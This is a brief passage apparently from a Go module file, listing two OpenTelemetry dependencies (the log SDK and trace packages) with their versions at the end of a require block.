    go.opentelemetry.io/otel/sdk/log v0.22.0
    go.opentelemetry.io/otel/trace v1.46.0
)
